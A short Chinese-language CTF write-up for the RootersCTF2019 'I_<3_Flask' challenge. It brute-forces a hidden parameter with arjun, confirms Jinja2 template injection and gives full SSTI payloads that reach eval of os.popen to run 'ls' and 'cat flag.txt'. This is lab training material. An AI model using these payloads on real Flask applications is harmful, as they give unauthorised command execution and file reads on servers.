---
title: '[RootersCTF2019]I_<3_Flask'
date: 2024-06-13 21:02:35
tags: ssti
categories: 刷题笔记
---

## [RootersCTF2019]I_<3_Flask

打开页面，我们寻找flask路由

扫了一下页面也没发现源码泄露，f12里也没有，我们考虑参数爆破

我们使用工具[arjun](https://github.com/s0md3v/Arjun)进行参数爆破

```
python3 arjun -u http://270ecd40-84d3-4667-bee9-04c7c2aeb5c2.node3.buuoj.cn/ -c 100 -d 5
```

速度慢到离谱，我们最后爆出来个参数name

<!--more-->

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210415084752420.png)

我们对name进行测试

```
?name={{7*'7'}}
```

发现为jinjia2模板注入

![image-20240613211738157](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406132117326.png)

我们先查目录

```
?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls').read()") }}{% endif %}{% endfor %}
```

![image-20240613212246181](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406132122381.png)

我们发现flag.txt，打开它

```
?name={% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat flag.txt').read()") }}{% endif %}{% endfor %}
```

